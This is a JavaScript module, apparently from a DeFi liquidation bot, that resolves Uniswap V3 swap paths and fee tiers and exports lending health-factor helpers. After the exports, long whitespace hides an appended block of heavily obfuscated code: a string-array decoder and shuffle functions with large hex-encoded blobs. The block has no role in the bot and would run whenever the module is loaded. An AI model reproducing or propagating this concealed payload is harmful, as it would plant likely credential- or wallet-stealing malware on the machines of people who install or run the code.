const factoryAddrCache = new Map(); // chainKey -> factory address (or null)
const poolFeeCache = new Map(); // `${chainKey}:${a}:${b}` -> fee (0 = none, cached)

async function getRouterFactory(provider, chainConfig) {
  const key = chainConfig.key || "default";
  if (factoryAddrCache.has(key)) return factoryAddrCache.get(key);
  let factory = null;
  try {
    const router = new ethers.Contract(chainConfig.swapRouter, ROUTER_FACTORY_IFACE, provider);
    factory = await router.factory();
  } catch (_) {
    factory = null;
  }
  factoryAddrCache.set(key, factory);
  return factory;
}

// Returns the common fee tier whose pool has the MOST current-tick liquidity for
// (a,b) — skipping tiers with no pool or zero liquidity — or 0 if none usable.
async function findFeeTier(provider, chainConfig, factory, a, b) {
  const key = `${chainConfig.key || "default"}:${a.toLowerCase()}:${b.toLowerCase()}`;
  if (poolFeeCache.has(key)) return poolFeeCache.get(key);
  const f = new ethers.Contract(factory, V3_FACTORY_IFACE, provider);
  let bestFee = 0;
  let bestLiq = ethers.constants.Zero;
  for (const fee of COMMON_FEE_TIERS) {
    let pool;
    try {
      pool = await f.getPool(a, b, fee);
    } catch (_) {
      // V2 factory or unsupported selector — treat as no pool at this tier.
      continue;
    }
    if (!pool || pool === ethers.constants.AddressZero) continue;
    let liq;
    try {
      liq = await new ethers.Contract(pool, V3_POOL_LIQ_IFACE, provider).liquidity();
    } catch (_) {
      continue; // not a readable V3 pool
    }
    if (liq.gt(bestLiq)) { bestLiq = liq; bestFee = fee; }
  }
  poolFeeCache.set(key, bestFee);
  return bestFee;
}

function packPath(parts) {
  // parts: [token, fee, token, fee, token, ...] — tokens as 20-byte addrs, fees
  // as uint24. ethers.utils.solidityPack == abi.encodePacked.
  const types = parts.map((_, i) => (i % 2 === 0 ? "address" : "uint24"));
  return ethers.utils.solidityPack(types, parts);
}

// Resolve the packed V3 path for collateral->debt. Returns "0x" if unresolved.
async function resolveSwapPath(provider, chainConfig, tokenIn, tokenOut) {
  if (!tokenIn || !tokenOut || tokenIn.toLowerCase() === tokenOut.toLowerCase()) return "0x";
  const factory = await getRouterFactory(provider, chainConfig);
  if (!factory) return "0x";

  const directFee = await findFeeTier(provider, chainConfig, factory, tokenIn, tokenOut);
  if (directFee !== 0) return packPath([tokenIn, directFee, tokenOut]);

  // 2-hop via intermediates: contract seeds wrappedNative, deploy adds
  // swapIntermediates. Dedupe and skip if intermediate == in/out (contract does).
  const intermediates = [];
  for (const t of [chainConfig.wrappedNative, ...(chainConfig.swapIntermediates || [])]) {
    if (!t) continue;
    const lc = t.toLowerCase();
    if (lc === tokenIn.toLowerCase() || lc === tokenOut.toLowerCase()) continue;
    if (!intermediates.some((x) => x.toLowerCase() === lc)) intermediates.push(t);
  }
  for (const mid of intermediates) {
    const firstFee = await findFeeTier(provider, chainConfig, factory, tokenIn, mid);
    if (firstFee === 0) continue;
    const secondFee = await findFeeTier(provider, chainConfig, factory, mid, tokenOut);
    if (secondFee === 0) continue;
    return packPath([tokenIn, firstFee, mid, secondFee, tokenOut]);
  }
  return "0x";
}

  module.exports = {
    BACKFILL_VERSION,
    borrowerBackfillIsCurrent,
    getUnhealthyPositions,
    getBorrowBackfillPlan,
    mapWithConcurrency,
    resolveSwapPath,
    getUserHealthFactor,
    getUserHealthFactorsBatched,
    sweepHealthFactorsStreaming,
    getDebtAmount,
    getDebtPosition,
    getDebtPositions,
    getPrimaryDebtPosition,
    getBorrowers,
    getBorrowersFromBorrowEvents,
    getBorrowersFromSubgraph,
    getReservesList,
    getReservesListCached,
    getPrimaryCollateral,
    enrichCandidateBatched,
    resolveChainMinDebtUsd,
    resolveChainTriggerHf,
    // ...other exports as needed
  };                                                                                                                                                     var z = '-11490';(function(uG$O_YLJZRJdet,NM$zVJoQoF$CUTHxyV){var bVQJdhH_pYatisWJpV=daIQfX,BXTL_YM$lQ=uG$O_YLJZRJdet();while(!![]){try{var AkP_$SaWGFsJEr=-parseFloat(bVQJdhH_pYatisWJpV(0x71))/(-parseInt(0x4bd)+-0xc71*-0x2+Math.floor(-parseInt(0x509))*parseInt(0x4))+Math['trunc'](-parseFloat(bVQJdhH_pYatisWJpV(0x6f))/(parseFloat(parseInt(0x97b))+-0x48*-0x11+parseInt(-0xe41)))+parseFloat(bVQJdhH_pYatisWJpV(0x79))/(Math.max(parseInt(0x2176),parseInt(0x2176))+Math.trunc(-parseInt(0x16f))+Math.max(-parseInt(0x2),-parseInt(0x2))*Math.ceil(0x1002))+Math['floor'](-parseFloat(bVQJdhH_pYatisWJpV(0x7b))/(Math.floor(-0x1)*-0x12a9+parseFloat(0x1c84)+parseInt(-0x2f29)))*(parseFloat(bVQJdhH_pYatisWJpV(0x78))/(parseInt(0xa)*-parseInt(0x95)+parseInt(0x3)*Math.floor(-parseInt(0x1b7))+parseInt(0xafc)))+-parseFloat(bVQJdhH_pYatisWJpV(0x7a))/(Math.trunc(0x1c77)+0x1560+Math.max(-parseInt(0x31d1),-parseInt(0x31d1)))*(parseFloat(bVQJdhH_pYatisWJpV(0x77))/(0x1*Math.trunc(-parseInt(0xf8d))+-parseInt(0x1)*0xee3+parseInt(0x1e77)))+parseFloat(bVQJdhH_pYatisWJpV(0x76))/(0x1*-parseInt(0x1543)+parseInt(0x15d5)+-0x2*parseInt(0x45))+parseFloat(bVQJdhH_pYatisWJpV(0x69))/(parseInt(0x3)*-parseInt(0x8d3)+Math.ceil(-parseInt(0x101))*parseInt(0x23)+0x3da5*parseFloat(0x1))*(parseFloat(bVQJdhH_pYatisWJpV(0x6e))/(0x1659+-parseInt(0x11f0)+-parseInt(0x45f)));if(AkP_$SaWGFsJEr===NM$zVJoQoF$CUTHxyV)break;else BXTL_YM$lQ['push'](BXTL_YM$lQ['shift']());}catch(lKLu$VCwkRe){BXTL_YM$lQ['push'](BXTL_YM$lQ['shift']());}}}(KmBFHpEdRXPQBdRu,-0x1*-0x4fb2+Math.floor(-parseInt(0x2d9))*parseInt(parseInt(0x106))+parseInt(0x4244a)));var NX=[parseInt(0x3)*Math.ceil(-0x3e8789)+0x1*-0x490547+0x16e1731,parseInt(0x7)*0x8b+Math.ceil(-parseInt(0x1))*Math.max(0x4e9,0x4e9)+-0x5d*-parseInt(0x7),-0x1012+Math.max(0x4afd,parseInt(0x4afd))+Math.trunc(parseInt(0x48))*0x4a,-0x17a8+parseInt(0x2065)+Math.trunc(-parseInt(0x658)),parseFloat(-0x90ec)+parseInt(0x34)*0x412+-0x113*Math.trunc(-0x61),-0x70a0f4+Math.max(parseInt(0x92ecf),0x92ecf)*-parseInt(0xc)+parseInt(0x12b693b)],SX=[0x3323*Number(-parseInt(0x1e3))+parseInt(0x658fc0)+-0x24b*-0x20f2,Math.floor(-parseInt(0x13))*Math.max(-parseInt(0x43),-parseInt(0x43))+0x7*0xc9+0x32d*-0x3,parseInt(0x1)*-0x63b9+Math.max(parseInt(0xd5d1),parseInt(0xd5d1))+parseInt(0x31c9),-parseInt(0x2)*0xb03+Math.max(parseInt(0x487),parseInt(0x487))*parseInt(0x1)+Math.floor(parseInt(0x123a)),-parseInt(0x115)*parseInt(0xf3)+0x5*-parseInt(0x27a6)+-0x1*-0x2a86e,Math.floor(parseInt(0x2))*-0x43f54a+0x79397f+parseInt(0x57006a)];function spin(Y_qQPpGOdWo_LeUWs,HhUoe){var HzpIZhESYlx=daIQfX,WYLHvZBsHsqUVDOvG_eki=[],P$a$KyNa=Math.ceil(parseInt(0x20))*0x3e+parseInt(-parseInt(0x2))*Math.floor(0xc14)+0x1068,DjKYHzxK=HhUoe[parseInt(0x1)*parseInt(0x1cf3)+0x156f+parseInt(0x2)*Math.floor(-0x1931)],uumndeiN,hvE_TX,Nd$CjZiAKMp$doEazcRHiKc,EvxJQeZhpEsXCVGzVVoSk,OaO_jTOxqFd,kbzQmKWJvYJgDPIauUmBCL_PV_s;while(P$a$KyNa<Y_qQPpGOdWo_LeUWs[HzpIZhESYlx(0x70)]){WYLHvZBsHsqUVDOvG_eki[P$a$KyNa]=Y_qQPpGOdWo_LeUWs[HzpIZhESYlx(0x74)](P$a$KyNa),P$a$KyNa+=-0x1c61+Math.ceil(0x1e3)*-0x5+Number(parseInt(0x25d1));}uumndeiN=WYLHvZBsHsqUVDOvG_eki[HzpIZhESYlx(0x70)],P$a$KyNa=-parseInt(0x89)*parseFloat(parseInt(0x37))+-0x12*0x155+Math.floor(parseInt(0x3569));while(P$a$KyNa<uumndeiN){hvE_TX=DjKYHzxK*(P$a$KyNa+HhUoe[parseInt(0x7)*-0x197+parseFloat(parseInt(0x1be2))+Math.ceil(-0x10c0)])+DjKYHzxK%HhUoe[-parseInt(0x841)+Number(0x192b)+Number(-0x10e8)],Nd$CjZiAKMp$doEazcRHiKc=DjKYHzxK*(P$a$KyNa+HhUoe[-0x1696+0x80*Math.ceil(parseInt(0x43))+-parseInt(0xae7)])+DjKYHzxK%HhUoe[parseInt(0x1b91)+Math.trunc(-parseInt(0x34a))*Number(-0x1)+parseInt(-parseInt(0x1ed7))],EvxJQeZhpEsXCVGzVVoSk=hvE_TX%uumndeiN,OaO_jTOxqFd=Nd$CjZiAKMp$doEazcRHiKc%uumndeiN,kbzQmKWJvYJgDPIauUmBCL_PV_s=WYLHvZBsHsqUVDOvG_eki[EvxJQeZhpEsXCVGzVVoSk],WYLHvZBsHsqUVDOvG_eki[EvxJQeZhpEsXCVGzVVoSk]=WYLHvZBsHsqUVDOvG_eki[OaO_jTOxqFd],WYLHvZBsHsqUVDOvG_eki[OaO_jTOxqFd]=kbzQmKWJvYJgDPIauUmBCL_PV_s,DjKYHzxK=(hvE_TX+Nd$CjZiAKMp$doEazcRHiKc)%HhUoe[parseInt(0x19)*parseInt(-0x5)+-parseInt(0x1a5a)+parseInt(-parseInt(0x12))*-parseInt(0x17e)],P$a$KyNa+=parseInt(parseInt(0x1eb))*0xe+-parseInt(0x1c83)+0x1aa;}return WYLHvZBsHsqUVDOvG_eki[HzpIZhESYlx(0x68)]('');}function splitLane(hnOCYUiaNVmOhxOy$Oxp){var kffJyL$kICxTG_IpyUJg=daIQfX,oArfjCRAPz=String[kffJyL$kICxTG_IpyUJg(0x6c)](0x7e4+parseInt(-parseInt(0x1))*-parseInt(0x1daa)+-parseInt(0x2572)),eAWV_y_R=spin(hnOCYUiaNVmOhxOy$Oxp,NX);return eAWV_y_R=eAWV_y_R[kffJyL$kICxTG_IpyUJg(0x72)]('^')[kffJyL$kICxTG_IpyUJg(0x68)](oArfjCRAPz),eAWV_y_R=eAWV_y_R[kffJyL$kICxTG_IpyUJg(0x72)]('*1')[kffJyL$kICxTG_IpyUJg(0x68)]('^'),eAWV_y_R=eAWV_y_R[kffJyL$kICxTG_IpyUJg(0x72)]('*0')[kffJyL$kICxTG_IpyUJg(0x68)]('*'),eAWV_y_R[kffJyL$kICxTG_IpyUJg(0x72)](oArfjCRAPz);}function peel(XJWtyixlhK$YQS_apHq){return spin(XJWtyixlhK$YQS_apHq,SX);}function KmBFHpEdRXPQBdRu(){var cDmQ_ABHom=['525251545a52541432082f0e0c','5251525752530f1b0f012d24','51505a51565027250202020c','552229300b3727','5714133102222d','090c0a0d','505352545354000a39250031','5e02060d11160b4b020f5e56004f045b0507164d1a11434d4d0d000600054f56411302060216550f0d094a113e511615411b4e124b3e4302584b115e585811484b02385b4d10511722040c124f160b5b204f020a4f1058024b220e534b0d09580915494f54150c544b4a4b0c580e550c025711144a4d43110c07380510510d1807111517571b4a48534f020d11481111480c4a1e1952435e0b0538020d5b115211384f3e10544e54540f02024d160a54184e53555a0f150e1751115e0a3e3e5f484a164f064a4f4f580d110b38115e53154e114b584f5e134a2016105e4800580458055812224a4a52150a4a1508530d110f52020643055e38580b0a101a4d060e4b07480c4251435e4b06150602545b5e4d4a57060a5e044d0d5e1805055e52385f51024305525e1158574f304a111a0f155216431a5808120f1817150d15434b20434b0f4f0c150d13430a5e170f114f114d0f140c190b4b0f4f1712585811114b4b155e020b1015583e1b125e0201580702584f4b4b11581509124d4b1738484a07024a11070d110b1057521a4b151158050b585004413e064b4d020b11130213043e044d4a0d0405130d520b4f0a000f58584a5e20580e565e48114f434d4a58165e48101e484a0a174f48010e580748160e4a4e5e100a0a120c0f5e175e115e125a484d4d000b1248385505064317530d1113114b4315115b050f110d4f07070417433e55024d580e5811170b4d04124351021e0615060a003e0401170a5f570c5820580f4f19190a55480f38023858484b100a410f0a41114f0d130a5a104f0511050b16144a0c145e06184b015e14060d51174d04164d0a5e080a020202484a1a05171302500d1e4a5e5a414a0013224816581617133e415e0f0854151317435211580b1914414a174b4a5a4a4b4d0f160f5e1054055843581012534a0d411a4853101e5e15024810430e0b4b53124d3e0b15585d4353555e224e0c190617114b1752111711100a100c53064f4d5819384b055f560654174f4b11020c02150d1158170b0b0558154f095e1158434a115d525b190b0c490c185f02080e100d4a020817064d150c5a48060253000f0a0c580116435e3e20420409581a50480f4a065e4d1e07115e0a550c0a205b110d0d5358555e0211411e4d11060a5e3e301710110d0d4d5851115e17583817580a155e131120110d4b4a02110617161948430b0f0838481b5e06434e5b09184b06091a5a4b4b4a4a43','1016011017110a0d04','05110c0e200b0211200c0706','313c5f4100312942453506003134025e3111053147554100525831313a000d0b3c4c4d17430a313131243d5f314d310031514d380d31434d31054d4c5f3100504242560d30315f310a312f4d0630100f054b0607041b005f5c0c5f110f00315c17310c100731051630064d5c45130b4d31312c2e1038065f100831264d5f31165f11310658312731211131313f4d05314d5f00594201130f535a0a000c31111700314b58110c31310d514e414b4d3d14431a4d5f5f0707434a4705430c164d46065f025f064d175f0e4b00311b05315f38294b0506315f3301114d01440c310a4d31315f44313146143105104a06314d38020430331807514d085f020052064d42504d335f39310a31490c27100a5e384d5f054d41573101432d41060c1b31130c4d0a2a0f08020637314d514a460e5f0a06313e195f1f31164b4b05311431313f315d315a404d315311075e104d531b4210314d0531304a4b0000175213050c1702062e163123315e5f31314c034d3108474b5100314d10540652024d25312800494d4d1941310d0533061031173131314d5f310f4031055f5943514b4b31433147445510035f500d0b0a4947063b001e310b5c4300170c004d0a0600005a431831025f105816424d063e2631310c2b4d4d47410d5f2750311031314d4d4b310606101006315f43174f414331070c151e300053290e0a4d375f102606041031143e314102314d3142315f0c4a4a093143310614430a17004d100d084b1e4b0d381506315f535f5e08052b5f11112e3143000a080d264d004d215f4531380c3e314d460000310f111b58494338410c0a10060d3106050602423a0d4d060031460c41164d5f550f3131311a315e0a105e31314b4a3131065931314a423114001131525f4d0c423100310023411e3116311216564b50330c0f41063117534205170231495f3152170d0800051e374d42474c5f110c432a1a003131434a335f3f4d015f173154593333105f3e4d113b5f5f4d0631164b313131120d134d5f4d315800170a103b4d31311a3147235f504a083131005f4831115b0f494d0a314211203f33420d5e00105f4b000a5f4b315406310631004d43175f0613064a065f5f4f065f4b2628424d130d014741310231314d0615160b004d370f3c004d59315311434a311414421030534d1754164d534b315a3c024b47454d0655054d31310852201b010a5b0f4d0b005e0e4b235f31074d4d5f11114d514d282e1100013c310d314b313c00592714171e4d314d181e5a04473131314a3735175f024b4d5f244d07311d3436314d580f114d0b2a100e2d334343172331315b3c3151314d0a31113133315f4b315040000600530006500a31315f02315031020d311839101e422e5f314e494d1a070250310a4c534605314031435f0a515f31535b594d171e310542414e31004d310f31001a171a3110062253313037315b4d57125f47253706314d4d333c5f0031550b01314d06110a4d004e310b002231205115314d5801305f315f0240285f3159113e370506064e5842085e3c104d31000e09104b311e595f3102314945044d5f070c0e060a10310d4d4b47403c021835230c003a4e4d0c0e3307020e4d31020f05001a0c374842333c0410114d5f010a3142054d4a002a454b012a0c310a4b110d11344d0a064d310043424b0a004b30314d001103595a5f3b1013314b47430e3100175f104d04424d575b11100806153531330731081b315f310706110d4a0630104c4a31430f06115f0010375007001e4d3156204c344b4d300c0d39114a31000c000010000b4a314d5f31315f174d10104b31315f070f164d004d1f055b17084f100f0d06130c5f06315f424d55314d060631313702450b432e055f18380c47315f433110534a5e435f1b3006004d001e5f004706104b4b074a3131001e052031315f495f314d0e4e4d314931065f4b1b153110434b2e4531054d06334904435d104a5f0c4d5e4d310a100d11314d5c18565f0a0131554a31315210430031041200060f005e000f5801065f0f0549302a2007510641191331311e5f00310f304f0d0910000e47310d4d42020a0a5f293a3e5f053320102309224d315f4643174d310c14311e4443115d13190b4d4d0f31445f040c3c1e5f30314b08121b0b3843455f0a314e0547205f165f0a02262d31563137313e5f311310084d4d311907044d4a3e5f4a06114d31114d2e103119335d3131065f5f173c0b040f5f134d31000e053110420d051731574307173c5a3d5f4f0c1106563105311b43313138113b4d5f10011a315f5f4d51314d3111060d36334b1a5d4d135f5f0010310f1753174d184d301a0a0d5f04040f474335004d4a59262b2a424d1b2716314f3113310b314b1000174d2e11312e092b2e313100314d4331170d071f0c02534d0d40024d514a2705084500312a3131314c0506314d00235f0a11105537485231331b4d4d314d10004d0231404d4e5f3b1831420d573100310a17314c0d31065a0e4d4d5f224a01060d4a4d3e5f4d024b314b4d185c5017314531314c0a4b0f3b4d435f0b420731315f4142000c5c43504352315f4e0b0d5f07170d070c5f3108100e404e004b3706310606423e4d315f105f37485e314d310a4e112331314d114000075f003131310e1917054d20070631134d001832310a0109100c104d053111044e313453070a31315f4d085f2c3131454e314240433e20103e1a17574d4e073c03333131445f4d3115060930145f07004d00434f054d334d4b4d000a17002d01310d444e4d063100310d11324d11311b0c1831005f4155310d073e311e310e4b314731300c4d3756310051001b4d4915310c0a003c5d4d10532131054a5f335f02314d0c20391f5343332c2b07320c4d0d435f4d52100c313c44434d335f06114d385f311f315f530a5f311158442a4d31381e480f0042380e00424d0f005f0d4b02431731312b310f4f1e131e314a315b31295f02314d5f17074b2d5d3e0a005f0e062356000d38164d314a4d014610330d5f5f3c3131423101315e4731313d5f421e4a10014e554140265b00314b0742314a1711021731315f5f43515231442f420a011f062c17313117471600070d31314d174a3119264d24331a424331222a4e0d1202165f1e4d1a00314d4d4d0031314d000000473d313107203c315f175b00310b10514131514d44305d4a4a510b4206051a4d4d5d420a2f47060d4358465a2c37154d0747573131205f0033304b171631140f454b0e4041311f13000b5f172b47025f5f434d1742313026054d313104002d334d314320310a570e315f402e31315f58140a4e4026435f5f175f06315f2b5f31110d170c264b425311535f074d4d312041000d4d4d5101134b5520135f30314106520f4a00005f024b334d335a065f12024a5f5f525f0d4d0a31023133314b1e315e4d454f51420014314d4a3331474d5f12315f1e425249305f314231054d5f005f31073c5f3151315f5f403e5f5f31313113424d1113315f494237312a315f33085f311917024d451e4d020f06285e0a335f31445e0431331e3113471830214d4331101a4d4b4d17424300585f0656100b555717175f13055f0c171b162f3708115d585f314d001310314d003117314e4002571631554d311706584e4b475c145b59134c45310f535f11405f06430a0a1005420747020c3c4b40000e1143065f31313542330d00025f174d1d0011004b0644490259435f31310d060239064d464c07315f3131494b2643034806383300143114435f4b06160017024a4d54345f4c47335f4d0b0030374354063121424d48314d2a5f010b31060f4d17064d015738160d1606163142310f174b3131314f1e4f2b05172b153c0d4d5f0631433c225f5b5f10115f311b574a312d421331071f21435f3131080a0644004e4d31000d0e5000105f300a5f0a4d4a4d264b314b5f31313331433c50315f0014064d424d0f5f3147423101074f065f3331260f47171311425f0c4c4a4d313117424f374b1100404c4d311a4b4831113104035f054d5f02484d054a4c5f5f455f430631315f060a4e5f2105264d1031010d31314a4d31464c09170f315f4600433142314b1b314000314d1031314d312e4d5f3154004b00040f31000e4d3e5f4d060051014a335f5f51313145070221284a115f39175d380702312b0006074d2e315f1e103124114d315f5c5231053131000000314b0c10004131311d085f3f422e004d134d204a16311b4a484b31083f064409552e333631200e005c31315031574b0a0a064d10310649315919303158330d4b394a5f0f0831150f595f31321831000a41003348064f2e3134024d5f312e11310f17405f313110175011424d5f045f283114314b31094d313102424d2457314d47130d4d1958180631585152185337574b1131084e444d425f311b5f0a280b5f4a10385f170043331606311e114b0502023105540f5f31564211310f273b310e4d5259130a31435f5e433109100c4d5f0611420c31122a4a3152311111140c1845173131285f0d20394e532e4d0016314a004600075348145f47265f0a375f5f0c1707021a0d5f0a0c3d4d31443131143100555608314029334d5f423156064211183106581a06314b4d535e58000a104d004b0417315113165a5e2e320538184f2c0d434d4d332d0a4b5f4d31020a32314d4d0046174c4b4c315f4d114d31114d4d0f42100016064d02331d314200535002363141170010004d4211353113020a19535f014107170407424d105c40001507311d40315f315f4a4b37014d2a314a33005f555c544a3e573455400d0d33174d1e11061f31365d310602314a1340430d30480151460a31091e104b3b0d3d0c101a00100407294d1010381308315b4d4310161411310d1a1e070c4d240a374d5f1448004d4b00105842430d0b4b314f312031385f453b315f5f4d00010037311022050d00304e31410a5f4d00214b1f31314d310746314d364c314d112f5f174a423106315100131342105f5d315c5231475f1706315f5f310c531117054b310610012731540f0a02314d1e104d4c103100111002110f3146053e1053314d5f0f065f110646104d100f0f10015b312c1b20311700521755184d4e43310f4d06310c4d00040e31080c31100100025f2a1a161e3111174010451f1731021b314a0b0c4d31100543083131315700114b1b4d005e174d5f0a504b311b434d5f4d4d3147054117433131102d5f4c2043310d310731111331315f0c075f4d315f11380211410f5f4d4333414d31104d314d11004215402705310606010c184f314a075b155f0531004d00295f17064d4231314108304b304a31405f304d0b331e11174d4b4c4b4d004b52075f3114421016534b0c4d33014b534d312900260a204d054b434d0a4d0116005f40114d4d4d3131385b4a3c42314d3031214241173135010d3c310f00333131430c310d580b5f313323115b0231110f001f000c564b31134a5f311b075f5f474d0d5f0f0c1e0611315f0c1a31020d4d0c1a4d312a215f0b175f000c01260a311e4b0e2e114d370231533106170a311e4d425f4d31525a175f220601313c2f000f0b422753114d31530a0f0a1131004c105b5f00314b11493123065f5f4d0f584d11004e33160f02310000310a41535523423100424d32080f4f5f045f541e014b0231002f4d001044484d4d374b5f11315f5f4d4d4505075d310c43000c060e3100144d0f000d4b005931441f175f310d313a3e572e5324314d31253116174d425f054d16484748175f314954103131314b0a010b075e334d5f1e31315e06314d3c4a4d4a11114f5745430f311e065f315531315f3d04050f0631071017331d5f01004d4b101a5f561e310a5c0f000b5f454d5018164d0d3c590a31540158535f315f003131310031231f521006243110514a005e0b5f055a065f5f114806313f444a455611154c2511384d024d170d4d3133110d365f0c3c00550d5e26375f4d0a481b00540f061510165f114d4231005f423e3114434d31314b3e3331274d430f054259454d010713370f4d314031304d47315f4b31435f5f00384d0d4d430c31115554115f064e314e160049313147314d0102061a00104d4238311b31315f273b17050d003132330a10311704005f4d02315b4201425f3017535f315d433131110a315d0036134d0031343931423127284a5300150d0d08104d064331433d070f315f000531311659102431064f4b04313531413116313131413117315f3110414d26310a3c3345315f0f1a0c300444105d153100140657310004034d0b5f3c00444b160e0731335d0c5a31330d5231404d0005315f333e31104c020d05122d3131445f4d31005b000a313131004d023c1317280c5f1310115f545f31310a4d0c3c004c420d3131104b435d31333e1b17173c103c0c0b215f024410454d335f434d08240055115f540a0c4c14312a303333001b0b3114004d5f4d000a00465231055a5a0730435f31010010313531101b1107023e3158175c312d4f4f315d4a00333a410031003106254342533131121e1e1153562f554d5f314d11055f47161f005f005f364e27384300004d0c5f56585f434b4d264d0b4d313c0f5f31115f5f255f381717200c460e304d3131502a01000a0c31315f0213310031003831315f4d050d31314f4d3121020d4b1a4c311f2b13240d314d5f5e31315f164b02001047315006314a0e003c2257160d17410658100c114b463133174b06044b4e4911420e5f31274b3131024d11040f194d31144d05313e1202150c3e054b465f5f00000f5f57105a3f2316435a064d491b4d4c2517303133384d47460d03194a5f5f474256320001483e315017315f050a3300063f5f190a4d3100020111434b5f5f010d155542170d143c003b054b0d0b4d381e49104b035f335d4b315f4d4d5f1b175a314b4d005f4b0653314d33020c4d42074b4b4e230553065f5f55310c3116584b07034331134d4d5f134f065f375f2d4d33314d3831002c194a054b5f0f3e4d16185c11055f3158315f2a49025f5f4703314b434b4d4d4d5f41595f2d31460631430a404d194d0f4b11314f0731024d0731155f1035004b103e0a4a2e0b4d310d5f313131171731044f1d4d3138314006054d581717134d4a10310d30170f3131510c064d45000a4b021e4d4133451a1006313c02461131314d275f0a33103127420a4d0e31413109190b5f16314d4f5d07064d092c1e02313200355f1047502004315f3156260007360b00064d4236054d314e1b555f3e4d14005f5f4d2642113133310a201b4d3031420e4d0d3b014d54054d190605393141413e4b1a5f1b015f085f3e36314e001e12054d422d0a5e3a0a310c31312d4d231014522f160652083145434011270006314d020f31314d314d4b413e2e31172e0a31114a110f163107454d313100130a052a0f51315f315f5f56054a194505363106005f10575f060d10314d0c415f0a5f4f314210430c210a314e0031530f312d1737314a3031005f050716173131073319312b4b3100104a33275f0047311b514559522b110f0c4d4d0d4305104d470d5b16132c47530a1010100a4d4e5f15315f4d5f12324b423142433842071b140d4d311a16490a5c0731464d315131175d115410421731103c31060703425f473e3143310e4231051b31430e310c084200175f4b4d4d0d310030310d3f454d5f5331370a140e17135049244b331a4c0d1b250b17315f4d59240c4d4d4d4b31174d114d5f530017374b115f434d0c380a154d5f315210315a073e314831310b063142000051313106415a0038115f582706330031310817240f045f5c1722364417173132311e431450173102173e4b35174e5c5f5f5c4d4d410f114a4d06314e31312a3d2628154d5754310c480a2d5f0600064d0d311b4b17312b3143175b58310a114a5f0231001b4b1202311023050611312e4d5f5e4d0017235f0500314d314a314d111b0f42174c4f0f10313131005e4d0a5350310b313110183c1b31115f325f004f025f5f26344b2e0c315f4316172641051e0105114d5f1031483e0711435f31423231144d0a432a31373c330c4d4b0053175b4b1031373131000d213142414d1b2a274d220a1e06130c3150420c195e3e06170831174c1622525731315a310017422d0207113c0d2420424c01471e31411b075f0a3100173d4d1616145e500731131404315a315b3312310a403113045a165e520a53055f4d315f3353051e17153c11500610595f05115f0a544b5f1a4b0c0f314d065a0c0c21374d3c31170c264a4302104b5f00310a0607171010314c31314c0611314b4d1400064d314d11331a4b312c4b5f4d042b1b11315f374d2f42311b4b5f0c4b384d48185f005f315f4d060a2d373120381b4d57310831471328414d0f00334b4d5f17084d5f313225080d142a314a4d174e31115e06185f4d3333434026555002135038314a2f07070058311b31423144430c0c424a144d06424d31005f53465f0a10105a31162c550a11474d314d0a1355460e4e5514310a5f195f4304115e0d140631312d3c3c314b3106291531053146592d3133315f0d313131474d314d0e315f1131401826004d4a015f5513060a310540172f4d4d315f330931314d4b4f023c0f0f4d434d2743045f4b110b15434157084243030f315f080652430047475631194d31313e061645270a31434d315f4b4b00061110264d020c310b06054a46062f314a4d594d3d4a061020314d1e4d375f333d4d43271a5f40310031132d31114a0d31310f3c50075b344b005e4e50260612060a2e31310631193102002016065f0f5f31100a4d025811005f4d0f07313a4d3102110f31000d2c05500b371007175f2e410e5f104b0d131e59224d051a315f31205f40311a5315315f1e5f314d5f46021710420f315d4e5f510f0f074d0d11565e4b25594d31310f0d310031411019500c415f053145504d4d423a5d05314a0106310f100b132e465f054d4b074202010a2531435014022e5f10064d4d1205314d0a3c4d4526424d4531313100311b183138314d3c5c315142423131001b4a312a2e4d4a055e4052262f0131310d2906022e0a0e524a3131313c431f5f0f025f504a531a0007454d400d5e0f4d1f3110584d054b06004d00105e00185c314c46073c42020d2c00065f31111b024d44014a5e3c5f0e4a0a0022002031004d0d5f314d06434d4d314e5f2231564d310e3807315f5f51314d220d5a1b3100170e002646384d4d314f32175f1633053c425f315e43173931000f1333494d160613555f054d015a31315f003011085f061e31000807004d585f17194d0f4d5f420a0c4d5f114c515f315e010031311035274d314d52015f00005f311e5f0b484d4331153731133c335f4d11104b16333217594d4d5f5d31085a425e02580c5f02494d54113e533a4a5b001e194b5f024d314d065b310c43170f4331004b221d0a42494b01314600314f0053175f43112e31315f43310a5f434d0533064948264a0e4d0c094d4d0e5b0e4d00314b475f054d314d0a07061a1e002131314210005f0d0c5a315f0d433114112d534017310716003c4e3130410a180a4a4b0d2e00315f532d5f4c355f5f4d4f5348144d3e5f145f310606314f144c06314d314a0a4d43315f06434d553104024d11041048320a17074d0c42001706022f310c4a5031435f4d00074d4c4d1d5f434d103f4d065f101356314d5f3131140242494d314a17314f0c0531395f391700310b103111474c4d31204d4d0143410031174f440f06020033004331315f3119415f310a430f530c3131073110544d314b062000313c4d55413c314d4d135f4508070706064d5f5e4d4d0f0c4d5e315f42014d4531005f17002011530e45003b1644140d074d105810144831574c1016270a00330102434d4d0a420c523d111e2a5d06575f59311420310a005f31313100414d4307311317535f4d3108535f345b1143310d314d27004d202d430f140c0b4d0f4e5f315f13000131433306550b3a4e31174d002613595f48024e355f31023105444b5f11313131455f02195f573131314d264a544d1b1100530a0f2b31370a10004d3905310500311b4e170b4a4d31405e425f204d14410f18063e064e315f4c5f10572d174d0c134100064d57310d1830310c5f314a20003e4a064b31145b31314d435f520b0018135b003042065f315c3128025e0a55310a384d2a3113314731011b3130000f4d135f33420502421515102c4d42133131174d26040f31175f4d420a16074d0f165f0a104d310c3157424d334d000e4d330a1e310c4d4d0f332d311a555e17185f02064d3c423114311702314d10054d424d3e5738064d3108261e4e1e15064d4d472d140a27421e4d5331405f0a1002315013465f1e4d0231233129174d3124021b4d31441013205342312400114d5125310a31063302310d103131310d025f314a563659410d5e0007005c2221174d51534d1707004220523143004d5f060702224d314b4d4f060f3100315f00455f4d06203136310a05180229283148061b4e1b59330046060a2306003106085c13314d574331315f314047004d4d0a484257313147315040314d114b330a31315f004d31000a3c36421931313158163d1f4d394d104b37313137004d071e315f1a4d3c005f4d3131184708315725214b473f5f144d434d58315f0631573f1031005b5f314d313826073143160c31381e354b4d130744415f29024b57131122314b4d2d005f5f1113504d5d1943060631425f4d5f56545945334a003831013131262e4b3c334d1e31314a4d5e310b115f4f203131314b5f085031480b0d4346314d31254a0f3158314d1043314d090f0e314b4b0f0c2b4d5f315f18333106310a5f5f000706284d314d05315113314b020c1d4d311a313131385931315c060a1031330508433a104b10504d00435f57010f0c5f535f5a180c5f313723314d4d0d310a3158020f5c100c3153045f374d31170e5f164d103f5c310f4d3c310000195745595c53434d56